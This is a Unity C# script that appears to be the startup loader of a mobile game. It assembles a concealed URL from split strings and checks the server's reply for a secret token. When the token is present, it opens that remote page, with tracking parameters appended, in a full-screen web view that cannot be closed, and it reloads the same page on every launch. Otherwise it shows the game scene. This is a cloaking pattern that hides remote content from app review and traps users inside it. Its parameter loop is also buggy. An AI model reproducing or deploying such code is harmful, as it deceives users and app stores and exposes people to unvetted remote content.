using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class MainAOG : MonoBehaviour
{
    public List<string> splitters;
    [HideInInspector] public string oneAOGName = "";
    [HideInInspector] public string twoAOGName = "";

    [SerializeField] private string[] _subs;

    private void GoingAOG()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("Splash");
    }


    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("UrlAOGrequest", string.Empty) != string.Empty)
            {
                ASPECTAOGSEE(PlayerPrefs.GetString("UrlAOGrequest"));
            }
            else
            {
                foreach (string n in splitters)
                {
                    twoAOGName += n;
                }
                StartCoroutine(IENUMENATORAOG());
            }
        }
        else
        {
            GoingAOG();
        }
    }




    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaAOG") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { oneAOGName = advertisingId; });
        }
    }


    private IEnumerator IENUMENATORAOG()
    {
        using (UnityWebRequest aog = UnityWebRequest.Get(twoAOGName))
        {

            yield return aog.SendWebRequest();
            if (aog.isNetworkError)
            {
                GoingAOG();
            }
            int skedAOG = 3;
            while (PlayerPrefs.GetString("glrobo", "") == "" && skedAOG > 0)
            {
                yield return new WaitForSeconds(1);
                skedAOG--;
            }
            try
            {
                if (aog.result == UnityWebRequest.Result.Success)
                {
                    if (aog.downloadHandler.text.Contains("ThAngrfthGdslJxuq"))
                    {
                        string subs = aog.downloadHandler.text.Replace("\"", "");
                        subs += "/?";

                        foreach (KeyValuePair<string, object> entry in AppsFlyerObjectScript.DeepLinkParamsDictionary)
                        {
                            int i = 0;
                            subs += _subs[i] + "=" + entry.Value + "&";
                        }
                        subs = subs.Remove(subs.Length - 1);

                        ASPECTAOGSEE(subs);
                    }
                    else
                    {
                        GoingAOG();
                    }
                }
                else
                {
                    GoingAOG();
                }
            }
            catch
            {
                GoingAOG();
            }
        }
    }


    private void ASPECTAOGSEE(string UrlAOGrequest, string NamingAOG = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);
        var _fettersAOG = gameObject.AddComponent<UniWebView>();
        _fettersAOG.SetToolbarDoneButtonText("");
        switch (NamingAOG)
        {
            case "0":
                _fettersAOG.SetShowToolbar(true, false, false, true);
                break;
            default:
                _fettersAOG.SetShowToolbar(false);
                break;
        }
        _fettersAOG.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        _fettersAOG.OnShouldClose += (view) =>
        {
            return false;
        };
        _fettersAOG.SetSupportMultipleWindows(true);
        _fettersAOG.SetAllowBackForwardNavigationGestures(true);
        _fettersAOG.OnMultipleWindowOpened += (view, windowId) =>
        {
            _fettersAOG.SetShowToolbar(true);

        };
        _fettersAOG.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingAOG)
            {
                case "0":
                    _fettersAOG.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    _fettersAOG.SetShowToolbar(false);
                    break;
            }
        };
        _fettersAOG.OnOrientationChanged += (view, orientation) =>
        {
            _fettersAOG.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        };
        _fettersAOG.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("UrlAOGrequest", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("UrlAOGrequest", url);
            }
        };
        _fettersAOG.Load(UrlAOGrequest);
        _fettersAOG.Show();
    }
}
